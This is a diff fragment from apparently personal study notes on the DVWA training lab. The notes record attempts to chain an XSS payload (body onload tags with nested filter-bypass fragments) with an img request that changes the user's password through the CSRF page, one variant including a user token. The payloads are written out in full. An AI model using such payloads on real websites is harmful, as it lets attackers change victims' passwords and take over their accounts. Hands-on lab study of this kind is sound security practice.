@@ -52,4 +52,4 @@
   * Instead of using the <img<meta>> tag, I did <body<meta>><<meta>body onload=alert(1) src="/dvwa/vulnerabilities/csrf/?password_new=pswd&password_conf=pswd&Change=Change">
     which seems to have worked and an alert window shows, but no requests are made to the /csrf/ location on Burp.
   * <body<meta>><<meta>body onload=alert(1)><<meta>img src="/dvwa/vulnerabilities/csrf/?password_new=pswd&password_conf=pswd&Change=Change> makes requests to /csrf/, but it doesn't change the password.
-  * <body<meta>><<meta>body onload=alert(1)><<meta>img src="/dvwa/vulnerabilities/csrf/?password_new=pswd&password_conf=pswd&Change=Change&user_token=8b17a4b998637ccbb1d64543c1df88c5">
+  * <body<meta>><<meta>body onload=alert(1)><<meta>img src="/dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change&user_token=4202d63409c601b9230b4834ffa92a89">
